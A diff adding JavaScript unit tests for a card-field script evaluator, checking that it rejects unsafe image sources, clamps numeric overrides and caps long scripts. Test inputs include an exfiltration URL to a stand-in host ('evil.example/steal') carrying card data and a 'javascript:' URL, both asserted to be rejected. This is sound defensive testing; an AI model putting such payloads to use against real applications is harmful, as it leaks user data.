@@ -49,4 +49,40 @@ describe('evaluateFieldScript', () => {
   it('reports script errors instead of throwing', () => {
     expect(evaluateFieldScript(`return { color: unknownVar };`, context).error).toBeTruthy();
   });
+
+  it('rejects image sources that could exfiltrate card data', () => {
+    expect(
+      evaluateFieldScript(`return { src: 'https://evil.example/steal?d=' + card.cost };`, context)
+        .src,
+    ).toBeUndefined();
+    expect(
+      evaluateFieldScript(`return { src: 'javascript:alert(1)' };`, context).src,
+    ).toBeUndefined();
+    expect(evaluateFieldScript(`return { src: 'data:image/png;base64,AAAA' };`, context).src).toBe(
+      'data:image/png;base64,AAAA',
+    );
+    expect(evaluateFieldScript(`return { src: '/sprites/card.png' };`, context).src).toBe(
+      '/sprites/card.png',
+    );
+  });
+
+  it('requires finite numeric overrides and clamps them', () => {
+    const result = evaluateFieldScript(
+      `return { x: 0/0, width: 1/0, opacity: 9, fontSize: -40 };`,
+      context,
+    );
+    expect(result.x).toBeUndefined();
+    expect(result.width).toBeUndefined(); // Infinity is not finite
+    expect(result.opacity).toBe(1);
+    expect(result.fontSize).toBe(1);
+    expect(evaluateFieldScript(`return { width: Number('999999') };`, context).width).toBe(8192);
+  });
+
+  it('caps expensive scripts', () => {
+    const huge = 'x'.repeat(20001);
+    expect(evaluateFieldScript(`return { text: '${huge}' };`, context).error).toMatch(/trop long/);
+    expect(evaluateFieldScript(`return { text: 'a'.repeat(1000000) };`, context).text).toHaveLength(
+      100,
+    );
+  });
 });
